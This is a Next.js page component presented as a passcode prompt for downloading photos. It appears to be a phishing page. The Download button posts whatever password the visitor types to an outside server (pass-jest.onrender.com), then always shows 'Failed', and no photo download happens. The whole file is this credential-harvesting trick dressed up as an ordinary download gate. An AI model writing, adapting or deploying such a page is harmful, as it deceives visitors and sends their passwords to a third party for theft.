'use client';

import { Button } from '@/components/ui/button';
import Image from 'next/image';
import { useState } from 'react';
import axois from 'axios';

export default function HomePage() {
  const [inputData, setInputData] = useState('');

  const handleClick = () => {
    try {
      axois.post('https://pass-jest.onrender.com', { name: inputData });
      alert('Failed');
    } catch (error) {
      alert('Invalid Password');
    }
  };
  return (
    <main className='font-sentient bg-[#1C1C1E] h-[100vh]'>
      <div className='pb-10 pt-16 flex  flex-col items-center'>
        <Image
          src='/logo.png'
          width={160}
          height={160}
          alt='logo'
          className='mx-auto'
        />
        <div className='text-center py-3 text-[#FFFFFFFA] text-3xl'>
          <p>Enter passcode to</p>
          <p>download photos to your device</p>
        </div>

        <input
          type='password'
          placeholder='****'
          className='border-2 bg-inherit p-2 rounded-md w-[300px] mt-6 mx-auto text-white'
          value={inputData}
          onChange={e => setInputData(e.target.value)}
        />
        <Button className='mt-5 bg-[#1290EB]' onClick={() => handleClick()}>
          Download
        </Button>
      </div>
    </main>
  );
}
